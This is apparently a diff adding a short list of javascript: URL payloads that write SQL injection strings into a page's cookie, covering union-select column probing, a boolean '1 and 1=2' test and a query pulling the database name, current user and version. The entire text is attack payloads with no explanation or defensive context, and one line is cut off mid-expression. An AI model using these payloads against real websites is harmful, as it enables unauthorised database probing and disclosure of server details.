@@ -1,0 +1,6 @@
+alert(document.cookie="id=3"+escape("3 union select 1,2,3,4,5"));
+javascript:alert(document.cookie="id="+escape("1 and 1=2")) 
+javascript:alert(document.cookie
+
+javascript:alert(document.cookie="id="+escape("150 union select concat(database(),current_user,version()),2-- -
+")) 
